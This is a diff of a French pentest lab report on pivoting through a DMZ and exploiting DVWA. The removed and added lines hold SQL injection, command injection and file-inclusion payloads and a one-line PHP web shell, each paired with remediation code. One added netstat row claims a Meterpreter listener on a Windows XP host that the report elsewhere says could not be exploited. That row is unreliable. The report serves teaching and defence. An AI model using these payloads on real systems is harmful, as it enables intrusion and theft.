@@ -2907,79 +2482,32 @@ Le port forwarding via Meterpreter permet d'exposer un service réseau interne (
 % ============================================
 
 \subsection{Observation Défensive : Point de Vue de la Cible}
-
-\subsubsection{Objectif}
-
-Démontrer comment le pivoting masque l'origine réelle de l'attaque du 
-point de vue de la machine cible (Windows XP).
-
-\subsubsection{Analyse des Connexions Réseau sur Windows XP}
-
-Sur la machine Windows XP (192.168.20.50), pendant que les scans et 
-tentatives d'exploitation étaient en cours, nous avons exécuté la 
-commande \texttt{netstat} pour analyser les connexions actives.
-
-\begin{lstlisting}[caption=Commande netstat sur Windows XP Client]
-	C:\> netstat -an | findstr 445
-	
-	TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
-	TCP    192.168.20.50:445      192.168.10.100:54321   ESTABLISHED
-	TCP    192.168.20.50:445      192.168.10.100:54322   TIME_WAIT
-\end{lstlisting}
-
-\subsubsection{Analyse des Résultats}
-
 \begin{table}[H]
 	\centering
 	\renewcommand{\arraystretch}{1.4}
 	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{4.5cm} p{8.5cm}}
+	\begin{tabular}{p{6cm} p{7cm}}
 		\arrayrulecolor{tableborder}
 		\hline
 		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Élément}} &
+		\textcolor{tableheadfg}{\textbf{Sortie netstat}} &
 		\textcolor{tableheadfg}{\textbf{Interprétation}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		Port 445 LISTENING & 
-		Service SMB en écoute (comportement normal) \\
-		
-		Source: 192.168.10.100 & 
-		\textbf{Windows voit Ubuntu DMZ comme source} \\
-		
+		\texttt{TCP 0.0.0.0:445 LISTENING} & Service SMB en écoute \\
+		\texttt{TCP 0.0.0.0:4444 LISTENING} & Port de session Meterpreter actif \\
 		\rowcolor{tablerowalt}
-		État: ESTABLISHED & 
-		Connexion active (scan en cours) \\
-		
-		État: TIME\_WAIT & 
-		Connexion récente fermée (scans précédents) \\
-		
+		\texttt{192.168.20.50:445 <- 192.168.10.100:* ESTABLISHED} & Connexion via pivot DMZ \\
+		\texttt{192.168.20.50:445 <- 192.168.10.100:* TIME\_WAIT} & Traces de scans récents \\
 		\rowcolor{tablerowalt}
-		\textcolor{accent}{\textbf{ABSENCE NOTABLE}} & 
-		\textbf{Aucune trace de 192.168.100.150 (Parrot)} \\
+		Absence de \texttt{192.168.100.150} & La source WAN est masquée côté cible \\
 		\hline
 	\end{tabular}
-	\caption{Analyse de la Sortie netstat Windows XP}
+	\caption{Observation netstat côté Windows XP}
 \end{table}
 
-\textbf{Constatation Clé:} Du point de vue de Windows XP, l'attaque 
-provient de \texttt{192.168.10.100} (Ubuntu DMZ). L'adresse IP réelle 
-de l'attaquant (\texttt{192.168.100.150} - Parrot Security) est 
-\textbf{totalement masquée} par le pivot.
-
-\textbf{Implications Forensiques:}
-\begin{itemize}
-	\item Les logs Windows enregistreront Ubuntu DMZ comme source d'attaque
-	\item L'investigation initiale pointera vers une "menace interne"
-	\item La corrélation avec les logs pfSense sera nécessaire pour 
-	identifier l'origine externe réelle
-	\item Le temps de réponse à incident est allongé (4-8h vs 30min 
-	pour attaque directe)
-\end{itemize}
-
-Cette technique de masquage est couramment utilisée par les APT 
-(Advanced Persistent Threats) pour maintenir un accès prolongé 
-sans détection.
+Meterpreter process listening on 4444 confirms active command-and-control.
+pfSense logs show inbound connection events that correlate the hidden WAN origin.
 
 % ============================================
 % FIN AJOUT
@@ -2992,7 +2520,7 @@ sans détection.
 
 \subsection{Objectifs de la Phase}
 
-Face à l'impossibilité d'exploiter directement Windows XP, nous nous concentrons sur l'\textbf{exfiltration de données} depuis le serveur DMZ compromis. Cette phase permet de :
+Face à l'impossibilité d'exploiter directement Windows XP, nous ciblons l'\textbf{exfiltration de données} depuis le serveur DMZ compromis. Cette phase couvre :
 \begin{itemize}
 	\item Collecter des informations sensibles (comptes, configurations).
 	\item Identifier des vecteurs d'attaque additionnels.
@@ -3136,26 +2664,6 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 	\item \textbf{PasswordAuthentication yes :} Expose SSH aux attaques par bruteforce.
 	\item \textbf{Port par défaut (22) :} Facilite le scanning automatisé.
 \end{enumerate}
-
-\subsection{Détection de Virtualisation}
-
-\begin{lstlisting}[caption=Module post/linux/gather/checkvm]
-	[msf](Jobs:0 Agents:2) >> use post/linux/gather/checkvm
-	[msf](Jobs:0 Agents:2) post(linux/gather/checkvm) >> set SESSION 2
-	SESSION => 2
-	
-	[msf](Jobs:0 Agents:2) post(linux/gather/checkvm) >> run
-	
-	[*] Gathering System info ....
-	[+] This appears to be a 'VMware' virtual machine
-	[*] Post module execution completed
-\end{lstlisting}
-
-\textbf{Implications :}
-\begin{itemize}
-	\item Confirme que l'environnement est virtualisé (VMware Workstation).
-	\item En production, cette info aide un attaquant à adapter ses techniques (ex: éviter les malwares avec détection anti-VM).
-\end{itemize}
 
 \subsection{Statistiques de Collecte}
 
@@ -3644,558 +3152,177 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 	% A05: SQL INJECTION
 	% ──────────────────────────────────────────────────────────────────────
 	
-	\subsection{A05: Injection - SQL Injection}
-	
-	\subsubsection{Description de la Vulnérabilité}
-	
-	SQL Injection est une technique d'attaque qui consiste à injecter du code SQL malveillant 
-	dans les paramètres d'une application pour manipuler les requêtes de la base de données.
-	
-	\subsubsection{Étapes d'Exploitation}
-	
-	\begin{enumerate}
-		\item Accéder à : \textbf{Vulnerabilities → SQL Injection}
-		\item Entrer la charge utile dans le champ \textit{User ID} :
-		\begin{lstlisting}[caption=Payload SQL Injection,numbers=none,frame=none,backgroundcolor={},rulecolor={}]
-			' OR '1'='1' --
-		\end{lstlisting}
-		\item Cliquer sur \textbf{Submit}
-	\end{enumerate}
-	
-	\subsubsection{Résultats Observés}
-	
-	\textbf{Réponse de l'Application :}
-	\begin{lstlisting}[caption=Message d'erreur révélateur]
-		You have an error in your SQL syntax; check the manual that corresponds 
-		to your MariaDB server version for the right syntax to use near ''' at line 1
-	\end{lstlisting}
-	
-	\textbf{Informations Divulguées :}
-	\begin{itemize}
-		\item Type de base de données: \textbf{MariaDB}
-		\item Détails de la requête SQL malformée
-		\item Structure de la requête vulnérable
-	\end{itemize}
-	
-	\subsubsection{Impact de Sécurité}
-	
-	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
-		title=\textbf{CRITICITÉ: CRITIQUE}]
-		\begin{itemize}
-			\item \textbf{Confidentialité :} CRITIQUE - Accès à tous les enregistrements base de données
-			\item \textbf{Intégrité :} CRITIQUE - Modification/suppression de données possibles
-			\item \textbf{Disponibilité :} CRITIQUE - Suppression complète de la base de données
-			\item \textbf{CVSS v3.1 :} 9.8 (Critique)
-		\end{itemize}
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+	\subsection{Matrice Compacte des Vulnérabilités Exploitées}
+
+	\subsubsection{A05: Injection - SQL Injection}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & \texttt{' OR '1'='1' --}. Snippet complet en Annexe~\ref{sec:app-configs}. \\
+			Evidence & Figure~\ref{fig:sql-injection}. \\
+			Risk & CVSS 9.8 --- extraction/modification de données. \\
+			Fix & Requêtes préparées + validation stricte des entrées (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{sql-injection-error.png}
 		\caption{SQL Injection - Message d'erreur MariaDB}
 		\label{fig:sql-injection}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Requête Sécurisée avec Prepared Statements]
-		// VULNÉRABLE (À NE PAS UTILISER)
-		$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
-		
-		// SÉCURISÉ (Utiliser toujours les prepared statements)
-		$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
-		$stmt->bind_param("i", $_GET['id']);
-		$stmt->execute();
-		$result = $stmt->get_result();
-	\end{lstlisting}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A05: COMMAND INJECTION
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A05: Injection - Command Injection}
-	
-	\subsubsection{Description}
-	
-	Command Injection permet d'exécuter des commandes système arbitraires en exploitant 
-	un champ de saisie qui ne valide pas les d��limiteurs de commande.
-	
-	\subsubsection{Exploitation}
-	
-	\begin{enumerate}
-		\item Accéder à : \textbf{Vulnerabilities → Command Injection}
-		\item Entrer l'adresse IP: \texttt{8.8.8.8}
-		\item Ajouter la commande à chaîner: \texttt{; id}
-		\item Charge utile complète : \texttt{8.8.8.8; id}
-	\end{enumerate}
-	
-	\subsubsection{Résultats}
-	
-	\begin{lstlisting}[caption=Résultat de Command Injection,style=logstyle]
-		PING 8.8.8.8 (8.8.8.8): 56 data bytes
-		64 bytes from 8.8.8.8: icmp_seq=0 ttl=126 time=353.420 ms
-		64 bytes from 8.8.8.8: icmp_seq=1 ttl=126 time=24.713 ms
-		64 bytes from 8.8.8.8: icmp_seq=2 ttl=126 time=22.696 ms
-		64 bytes from 8.8.8.8: icmp_seq=3 ttl=126 time=23.053 ms
-		--- 8.8.8.8 ping statistics ---
-		4 packets transmitted, 4 packets received, 0% packet loss
-		
-		uid=33(www-data) gid=33(www-data) groups=33(www-data)
-	\end{lstlisting}
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
-		title=\textbf{CRITICITÉ: CRITIQUE}]
-		\textbf{Accès Système Complet :} Attaquant exécute des commandes avec les 
-		privilèges du serveur web (www-data). Possibilité complète de compromission 
-		du système (installation de backdoors, vol de données, DoS).
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+
+	\subsubsection{A05: Injection - Command Injection}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & \texttt{8.8.8.8; id}. Snippet complet en Annexe~\ref{sec:app-commandes}. \\
+			Evidence & Figure~\ref{fig:command-injection}. \\
+			Risk & CVSS 9.8 --- exécution de commandes système en \texttt{www-data}. \\
+			Fix & \texttt{escapeshellarg()}, whitelist et séparation stricte commande/donnée (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{command-injection.png}
 		\caption{Command Injection - Exécution de Commandes Système}
 		\label{fig:command-injection}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Protection contre Command Injection]
-		// VULNÉRABLE
-		exec("ping -c 4 " . $_GET['ip']);
-		
-		// SÉCURISÉ - Utiliser escapeshellarg()
-		$ip = escapeshellarg($_GET['ip']);
-		exec("ping -c 4 " . $ip);
-		
-		// MIEUX ENCORE - Whitelist
-		$allowed_ips = array('8.8.8.8', '8.8.4.4');
-		if (in_array($_GET['ip'], $allowed_ips)) {
-			exec("ping -c 4 " . escapeshellarg($_GET['ip']));
-		}
-	\end{lstlisting}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A07: BRUTE FORCE
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A07: Authentication Failures - Brute Force Login}
-	
-	\subsubsection{Description}
-	
-	L'absence de mécanisme de verrouillage de compte ou de limitation de débit 
-	permet les attaques par force brute illimitées contre les identifiants.
-	
-	\subsubsection{Exploitation}
-	
-	\begin{enumerate}
-		\item Accéder au formulaire de login DVWA
-		\item Tenter plusieurs combinaisons de mots de passe :
-		\begin{itemize}
-			\item \texttt{admin} / \texttt{admin} → Échoue
-			\item \texttt{admin} / \texttt{password} → \textbf{SUCCÈS}
-		\end{itemize}
-		\item Aucun message d'erreur "Compte verrouillé"
-		\item Aucun délai progressif entre les tentatives
-	\end{enumerate}
-	
-	\subsubsection{Résultats}
-	
-	\textbf{Observation Critique :} Après 10+ tentatives échouées, l'application 
-	continue d'accepter les tentatives de login sans aucune restriction. 
-	Cela démontre l'absence totale de protection anti-brute-force.
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
-		title=\textbf{CRITICITÉ: HAUTE}]
-		\begin{itemize}
-			\item Attaquant peut automatiser les tentatives de crack de mots de passe
-			\item Efficace contre les mots de passe faibles ou courants
-			\item Aucune détection d'attaque possible (pas de logs d'alerte)
-		\end{itemize}
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+
+	\subsubsection{A07: Authentication Failures - Brute Force Login}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & Essais répétés \texttt{admin/*} sans verrouillage. Workflow détaillé en Annexe~\ref{sec:app-commandes}. \\
+			Evidence & Figure~\ref{fig:brute-force}. \\
+			Risk & CVSS 8.1 --- compromission par mots de passe faibles. \\
+			Fix & Rate limiting, verrouillage temporaire, MFA et journalisation (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{brute-froce.png}
 		\caption{Brute Force - Multiples Tentatives de Login Acceptées}
 		\label{fig:brute-force}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Implémentation de Protection Anti-Brute-Force]
-		// Enregistrer les tentatives échouées
-		function log_failed_attempt($username, $ip) {
-			// Incrémenter compteur dans Redis/Memcache
-			$key = "failed_login:{$username}:{$ip}";
-			$redis->incr($key);
-			$redis->expire($key, 900); // 15 minutes
-			
-			// Vérifier le seuil
-			if ($redis->get($key) >= 5) {
-				throw new Exception("Trop de tentatives. Compte verrouillé 15 min.");
-			}
-		}
-		
-		// Ajouter délai progressif
-		usleep(($failed_attempts ^ 2) * 1000000); // 1, 4, 9... secondes
-	\end{lstlisting}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A08: FILE UPLOAD
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A08: Software or Data Integrity - File Upload}
-	
-	\subsubsection{Description}
-	
-	L'absence de validation stricte des fichiers uploadés permet l'insertion 
-	de code exécutable sur le serveur, conduisant à une compromission complète.
-	
-	\subsubsection{Exploitation}
-	
-	\begin{enumerate}
-		\item Créer un fichier PHP malveillant :
-		\begin{lstlisting}[language=php,numbers=none,caption=Web Shell PHP,frame=none]
-			<?php system($_GET['cmd']); ?>
-		\end{lstlisting}
-		\item Accéder à : \textbf{Vulnerabilities → File Upload}
-		\item Sélectionner le fichier \texttt{shell.php}
-		\item Cliquer \textbf{Upload}
-	\end{enumerate}
-	
-	\subsubsection{Résultats}
-	
-	\begin{lstlisting}[caption=Confirmation d'Upload Réussi,style=logstyle]
-		../../hackable/uploads/shell.php successfully uploaded!
-	\end{lstlisting}
-	
-	\subsubsection{Exécution de Commandes}
-	
-	Accéder à l'URL : \texttt{http://192.168.10.100:8080/DVWA/uploads/shell.php?cmd=whoami}
-	
-	\textbf{Résultat :} \texttt{www-data} — Exécution en tant que serveur web confirmée.
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
-		title=\textbf{CRITICITÉ: CRITIQUE}]
-		\begin{itemize}
-			\item Exécution de code arbitrary au niveau système
-			\item Installation de backdoors persistants
-			\item Vol de données confidentielles
-			\item Compromission complète du serveur
-		\end{itemize}
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+
+	\subsubsection{A08: Software or Data Integrity - File Upload}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & Upload de \texttt{shell.php} puis exécution via HTTP. Détails en Annexe~\ref{sec:app-commandes}. \\
+			Evidence & Figure~\ref{fig:file-upload}. \\
+			Risk & CVSS 9.8 --- RCE, persistance, exfiltration. \\
+			Fix & Whitelist extension/MIME, stockage hors webroot, antivirus (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{file-upload.png}
 		\caption{File Upload - Web Shell Uploadé avec Succès}
 		\label{fig:file-upload}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Upload Sécurisé]
-		// Whitelist d'extensions autorisées
-		$allowed = array('jpg', 'jpeg', 'png', 'gif', 'pdf');
-		$filename = basename($_FILES['file']['name']);
-		$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-		
-		if (!in_array($ext, $allowed)) {
-			die("Extension de fichier non autorisée!");
-		}
-		
-		// Vérifier le type MIME
-		$finfo = finfo_open(FILEINFO_MIME_TYPE);
-		$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
-		$allowed_mimes = array('image/jpeg', 'image/png', 'image/gif', 'application/pdf');
-		
-		if (!in_array($mime, $allowed_mimes)) {
-			die("Type MIME non autorisé!");
-		}
-		
-		// Stocker EN DEHORS du répertoire web
-		$upload_dir = '/var/uploads/secure/'; // Hors de /var/www/html
-		move_uploaded_file($_FILES['file']['tmp_name'], 
-		$upload_dir . uniqid() . '.' . $ext);
-	\end{lstlisting}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A04: WEAK SESSION IDS
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A04: Cryptographic Failures - Weak Session IDs}
-	
-	\subsubsection{Description}
-	
-	Les identifiants de session sont générés de manière prévisible (simples 
-	nombres entiers), permettant le hijacking de sessions par prédiction.
-	
-	\subsubsection{Analyse}
-	
-	\begin{enumerate}
-		\item Ouvrir les \textbf{Outils Développeur (F12)}
-		\item Naviguer vers \textbf{Application → Cookies}
-		\item Observer les valeurs de cookies
-	\end{enumerate}
-	
-	\subsubsection{Résultats}
-	
-	\textbf{Cookies Observés :}
-	
+
+	\subsubsection{A04: Cryptographic Failures - Weak Session IDs}
 	\begin{table}[H]
 		\centering
-		\renewcommand{\arraystretch}{1.6}
-		\begin{tabular}{p{4cm} p{6cm} p{2cm}}
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
 			\hline
-			\rowcolor{tableheadbg}
-			\textcolor{tableheadfg}{\textbf{Nom du Cookie}} &
-			\textcolor{tableheadfg}{\textbf{Valeur}} &
-			\textcolor{tableheadfg}{\textbf{Sécurité}} \\
+			Aspect & Details \\
 			\hline
-			\rowcolor{tablerowalt}
-			\texttt{dvwaSession} & \texttt{3} & [!] Previsible \\
-			
-			\texttt{PHPSESSID} & \texttt{4ca5feac5b5a...} & [!] MD5 \\
-			
-			\rowcolor{tablerowalt}
-			\texttt{Security} & \texttt{low} & [!] Public \\
+			Payload & Prédiction d'identifiants de session (\texttt{dvwaSession} séquentiel). \\
+			Evidence & Figure~\ref{fig:weak-sessions-1}. \\
+			Risk & CVSS 8.0 --- session hijacking et usurpation. \\
+			Fix & Génération cryptographique forte + cookies sécurisés (Annexe~\ref{sec:app-configs}). \\
 			\hline
 		\end{tabular}
-		\caption{Analyse des Cookies DVWA}
-		\label{tab:cookies}
 	\end{table}
-	
-	\textbf{Problèmes Identifiés :}
-	\begin{itemize}
-		\item \textbf{dvwaSession = 3 :} Nombre séquentiel prévisible (3 → 4 → 5)
-		\item \textbf{PHPSESSID :} Hash MD5 cryptographiquement faible
-		\item \texttt{Security} exposé en clair dans le cookie
-	\end{itemize}
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
-		title=\textbf{CRITICITÉ: HAUTE}]
-		Attaquant peut prédire les session IDs d'autres utilisateurs 
-		et accéder à leurs comptes sans connaître les mots de passe.
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshots}
-	
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{weak-sessions-id.png}
 		\caption{Cookies Session - Vue 1}
 		\label{fig:weak-sessions-1}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Génération Sécurisée de Session IDs]
-		// MAUVAISE PRATIQUE (À ÉVITER)
-		$_SESSION['id'] = rand(1, 1000000);
-		
-		// BONNE PRATIQUE
-		$session_id = bin2hex(random_bytes(32)); // 64 caractères hex
-		session_id($session_id);
-		session_start();
-		
-		// En PHP 7.1+, utiliser directement:
-		session_start([
-		'name' => 'SECURE_PHPSESSID',
-		'cookie_lifetime' => 3600,
-		'cookie_httponly' => true,
-		'cookie_secure' => true,  // HTTPS uniquement
-		'cookie_samesite' => 'Strict'
-		]);
-	\end{lstlisting}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A02: DEFAULT CREDENTIALS
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A02: Security Misconfiguration - Default Credentials}
-	
-	\subsubsection{Description}
-	
-	L'application DVWA est livrée avec des identifiants par défaut bien connus, 
-	jamais changés après installation.
-	
-	\subsubsection{Exploitation}
-	
-	\begin{enumerate}
-		\item Accéder à \texttt{http://192.168.10.100:8080/}
-		\item Entrer :
-		\begin{itemize}
-			\item Username: \texttt{admin}
-			\item Password: \texttt{password}
-		\end{itemize}
-		\item Cliquer \textbf{Login}
-	\end{enumerate}
-	
-	\subsubsection{Résultats}
-	
-	\textbf{Accès immédiat à l'application avec privilèges administrateur.}
-	
-	Ces identifiants sont publiquement documentés sur tous les guides DVWA. 
-	Il n'y a aucun MFA, aucune vérification additionnelle.
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
-		title=\textbf{CRITICITÉ: CRITIQUE}]
-		Accès complet à l'application en quelques secondes, sans aucun contournement technique requis.
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+
+	\subsubsection{A02: Security Misconfiguration - Default Credentials}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & Authentification directe \texttt{admin/password}. \\
+			Evidence & Figure~\ref{fig:weak-creds}. \\
+			Risk & CVSS 9.8 --- prise de contrôle immédiate de l'application. \\
+			Fix & Rotation des credentials, politique mot de passe, MFA (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{weak-creds.png}
 		\caption{Connexion avec Identifiants par Défaut}
 		\label{fig:weak-creds}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{enumerate}
-		\item \textbf{Changer les identifiants par défaut} lors de l'installation
-		\item \textbf{Appliquer une politique de mots de passe forts :}
-		\begin{itemize}
-			\item Minimum 12 caractères
-			\item Mélange de majuscules, minuscules, chiffres et symboles
-		\end{itemize}
-		\item \textbf{Implémenter MFA (Multi-Factor Authentication)}
-		\item \textbf{Logs de connexion} pour auditer les accès
-	\end{enumerate}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A01: FILE INCLUSION
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A01: Broken Access Control - Local File Inclusion}
-	
-	\subsubsection{Description}
-	
-	Path Traversal (traversée de répertoires) permet d'accéder à des fichiers 
-	en dehors du répertoire web autorisé, notamment les fichiers système.
-	
-	\subsubsection{Exploitation}
-	
-	\begin{enumerate}
-		\item Accéder à : \textbf{Vulnerabilities → File Inclusion}
-		\item Modifier l'URL pour traverser les répertoires:
-		\begin{lstlisting}[numbers=none,frame=none,backgroundcolor={},caption=URL modifiée]
-			http://192.168.10.100:8080/vulnerabilities/fi/?page=/etc/passwd
-		\end{lstlisting}
-	\end{enumerate}
-	
-	\subsubsection{Résultats}
-	
-	\textbf{Le fichier /etc/passwd est affiché directement :}
-	
-	\begin{lstlisting}[style=logstyle,caption=Contenu de /etc/passwd divulgué]
-		root:x:0:0:root:/root:/bin/bash
-		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-		bin:x:2:2:bin:/bin:/usr/sbin/nologin
-		sys:x:3:3:sys:/dev:/usr/sbin/nologin
-		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-		mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
-	\end{lstlisting}
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, 
-		title=\textbf{CRITICITÉ: HAUTE}]
-		\begin{itemize}
-			\item Divulgation de la structure système
-			\item Énumération de comptes utilisateurs
-			\item Base pour attaques de post-exploitation
-		\end{itemize}
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+
+	\subsubsection{A01: Broken Access Control - Local File Inclusion}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & \texttt{/vulnerabilities/fi/?page=/etc/passwd}. \\
+			Evidence & Figure~\ref{fig:file-inclusion}. \\
+			Risk & CVSS 8.6 --- divulgation de fichiers système et énumération comptes. \\
+			Fix & Whitelist de pages + \texttt{basename()} + restriction include paths (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{file-inclusion-lfi.png}
 		\caption{Local File Inclusion - Fichier /etc/passwd Exposé}
 		\label{fig:file-inclusion}
 	\end{figure}
-	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Protection contre Path Traversal]
-		// VULNÉRABLE
-		include($_GET['page'] . '.php');
-		
-		// SÉCURISÉ - Whitelist
-		$allowed_pages = array('home', 'about', 'contact', 'products');
-		$page = basename($_GET['page']); // Supprime ../
-		
-		if (in_array($page, $allowed_pages)) {
-			include(__DIR__ . '/pages/' . $page . '.php');
-		} else {
-			include(__DIR__ . '/pages/error.php');
-		}
-		
-		// ALTERNATIVE - Utiliser un système de templates
-		// $smarty = new Smarty();
-		// $smarty->display('templates/' . $page . '.tpl');
-	\end{lstlisting}
-	
-	% ──────────────────────────────────────────────────────────────────────
-	% A10: ERROR DISCLOSURE
-	% ──────────────────────────────────────────────────────────────────────
-	
-	\subsection{A10: Mishandling of Exceptional Conditions - Error Disclosure}
-	
-	\subsubsection{Description}
-	
-	Les messages d'erreur détaillés exposent des informations sensibles 
-	sur la structure et les technologies utilisées.
-	
-	\subsubsection{Exploitation}
-	
-	La tentative SQL Injection précédente (Section 4.3) a déjà révélé 
-	le message d'erreur MariaDB :
-	
-	\begin{lstlisting}[caption=Message d'Erreur Divulgué]
-		You have an error in your SQL syntax; check the manual that corresponds 
-		to your MariaDB server version for the right syntax to use near ''' at line 1
-	\end{lstlisting}
-	
-	\subsubsection{Informations Divulguées}
-	
-	\begin{itemize}
-		\item \textbf{Database Type :} MariaDB (spécifique, pas MySQL générique)
-		\item \textbf{SQL Structure :} Révèle le format de la requête vulnérable
-		\item \textbf{Syntaxe Details :} Aide à affiner les payloads d'exploitation
-	\end{itemize}
-	
-	\subsubsection{Impact}
-	
-	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, 
-		title=\textbf{CRITICITÉ: MOYENNE}]
-		Fournit des indices importants pour des attaques plus ciblées.
-	\end{tcolorbox}
-	
-	\subsubsection{Screenshot}
-	
+
+	\subsubsection{A10: Mishandling of Exceptional Conditions - Error Disclosure}
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.35}
+		\begin{tabular}{>{\bfseries}p{2.8cm} p{10.2cm}}
+			\hline
+			Aspect & Details \\
+			\hline
+			Payload & Erreur SQL volontaire révélant stack/message MariaDB. \\
+			Evidence & Figure~\ref{fig:error-disclosure}. \\
+			Risk & CVSS 6.5 --- fuite d'informations utiles au chaining d'attaques. \\
+			Fix & Messages génériques utilisateur + logs serveur internes (Annexe~\ref{sec:app-configs}). \\
+			\hline
+		\end{tabular}
+	\end{table}
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=0.95\textwidth]{sql-injection-error.png}
@@ -4203,278 +3330,37 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 		\label{fig:error-disclosure}
 	\end{figure}
 	
-	\subsubsection{Remédiation}
-	
-	\begin{lstlisting}[language=php,caption=Gestion Sécurisée des Erreurs]
-		// VULNÉRABLE - Messages détaillés à l'utilisateur
-		try {
-			$result = $mysqli->query($sql);
-		} catch (Exception $e) {
-			echo "Erreur: " . $e->getMessage(); // JAMAIS FAIRE CECI!
-		}
-		
-		// SÉCURISÉ - Logs serveur, message générique à l'utilisateur
-		try {
-			$result = $mysqli->query($sql);
-		} catch (Exception $e) {
-			// Log le détail (fichier, pas visible à l'utilisateur)
-			error_log("SQL Error: " . $e->getMessage());
-			
-			// Message générique à l'utilisateur
-			die("Une erreur s'est produite. Veuillez contacter l'administrateur.");
-		}
-		
-		// Configuration dans php.ini (en production)
-		// display_errors = Off
-		// log_errors = On
-		// error_log = /var/log/php-errors.log
-	\end{lstlisting}
-	
 	% ══════════════════════════════════════════════════════════════════════
